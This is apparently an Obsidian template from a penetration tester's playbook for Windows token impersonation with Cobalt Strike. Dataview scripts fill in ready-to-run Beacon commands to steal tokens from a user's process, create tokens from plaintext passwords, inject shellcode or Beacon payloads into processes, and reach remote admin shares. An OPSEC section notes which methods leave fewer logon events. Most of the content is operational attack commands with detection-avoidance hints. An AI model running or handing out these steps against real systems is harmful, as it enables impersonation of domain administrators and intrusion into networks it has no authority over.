---
# Attack-specific fields
impersonate_user:
impersonate_pid:
token_method: steal_token
target_fqdn:
make_token_password:
notes:
---

# Token Impersonation

> [!abstract] Attack Summary
> Windows uses **access tokens** to represent the security context of a process or thread. By stealing or forging tokens, an attacker can impersonate other users — including Domain Admins — without their passwords. Techniques include: **steal_token**, **make_token**, **token store**, **process injection**, and **token impersonation**.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const methods = ["steal_token","make_token","process_inject","token_store"];
const methodOptions = methods.map(m => `option(${m})`).join(',');

dv.table(["Field", "Value"], [
  ["User to Impersonate",  `\`INPUT[text:impersonate_user]\``],
  ["PID (for steal_token/inject)",`\`INPUT[text:impersonate_pid]\``],
  ["Method",               `\`INPUT[inlineSelect(defaultValue(${p.token_method ?? 'steal_token'}),${methodOptions}):token_method]\``],
  ["Target FQDN (after impersonation)", `\`INPUT[text:target_fqdn]\``],
]);
```

---

## Method A — Steal Token (steal_token)

> [!info] Find a process owned by the target user and steal its token. Requires local admin on the current machine.

**Windows — Find target processes**
```dataviewjs
const p = dv.current();
const targetUser = p?.impersonate_user || "TARGET_USER";
dv.paragraph("```bash\n# List processes\nps\n\n# Filter for specific user\nps | grep " + targetUser + "\n\n# Use SeatBelt to find interesting sessions\nexecute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe LogonSessions\n```");
```

**Windows — Steal the token**
```dataviewjs
const p = dv.current();
const pid = p?.impersonate_pid || "PID";
dv.paragraph("```bash\n# Steal token from process\nsteal_token " + pid + "\n\n# Verify\ngetuid\nrun whoami\n\n# List sessions to find target user\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe triage\n```");
```

---

## Method B — Make Token (make_token)

> [!info] Creates a new network token with explicit credentials. You still run as the current user locally, but network connections use the impersonated identity. Useful when you have plaintext creds.

**Windows — make_token**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain ?? "DOMAIN";
const shortDom   = domain.split('.')[0].toUpperCase();
const targetUser = p?.impersonate_user || "TARGET_USER";
const password   = p?.make_token_password || b?.password || "PASSWORD";

dv.paragraph("```bash\n# Create network logon token with explicit creds\nmake_token " + shortDom + "\\" + targetUser + " " + password + "\n\n# Verify\ngetuid\n\n# Revert back to original token\nrev2self\n```");
```

Password: `INPUT[text:make_token_password]`

---

## Method C — Process Injection

> [!info] Inject a Beacon payload into a process running as the target user to spawn a session with their token.

**Windows — shinject / inject**
```dataviewjs
const p = dv.current();
const pid = p?.impersonate_pid || "PID";
dv.paragraph("```bash\n# Inject into process\ninjection " + pid + " x64 SHELLCODE\n\n# Or use Beacon's built-in\ninject " + pid + " x64 LISTENER\n\n# Or spawn into a process's context\nspawnas DOMAIN\\TARGET_USER PASSWORD LISTENER\n```");
```

---

## Method D — Token Store

> [!info] Cobalt Strike's Token Store lets you cache multiple tokens and switch between them.

**Windows — Token Store operations**
```dataviewjs
dv.paragraph("```bash\n# Store a token from a process\ntoken-store steal PID\n\n# List stored tokens\ntoken-store show\n\n# Use a stored token\ntoken-store use TOKEN_ID\n\n# Revert\nrev2self\n\n# Remove a token from store\ntoken-store remove TOKEN_ID\n```");
```

---

## Step 5 — Verify and Use Impersonation

**Access target resources**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain ?? "DOMAIN";
const targetFqdn = p?.target_fqdn || "TARGET.domain.local";
dv.paragraph("```bash\n# Verify current identity\ngetuid\nrun whoami\nrun whoami /groups\n\n# Test access\nls \\\\" + targetFqdn + "\\c$\n\n# Revert when done\nrev2self\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - `make_token` generates **Event 4648** (logon with explicit credentials).
> - `steal_token` is stealthier — no new logon event unless network auth is attempted.
> - Process injection visible in memory — anti-malware may detect the shellcode.
> - `spawnas` generates a new process with **Event 4688** and **Event 4624** (interactive logon).
> - Track token operations and always `rev2self` when finished.

---

## Notes & Results

`INPUT[textarea:notes]`
